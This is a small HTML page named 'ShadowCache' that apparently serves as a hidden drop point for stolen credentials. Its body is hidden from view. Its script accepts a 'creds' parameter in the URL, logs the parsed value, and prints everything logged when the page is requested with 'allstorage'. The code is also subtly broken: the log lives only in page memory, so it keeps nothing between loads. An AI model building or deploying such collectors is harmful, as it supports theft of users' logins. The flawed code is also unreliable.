<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>ShadowCache</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; display: none; } /* Hidden from users */
        #credsLog { white-space: pre-wrap; }
    </style>
</head>
<body>
    <div id="credsLog"></div>
    <script>
        let credsLog = [];

        // Handle incoming creds
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            const creds = urlParams.get('creds');
            if (creds) {
                try {
                    const parsedCreds = JSON.parse(decodeURIComponent(creds));
                    credsLog.push(parsedCreds);
                } catch (e) {
                    console.error('Invalid creds:', e);
                }
            }

            // Serve all creds on /allstorage request
            if (urlParams.has('allstorage')) {
                document.write(JSON.stringify(credsLog));
                document.close();
            }
        };
    </script>
</body>
</html>
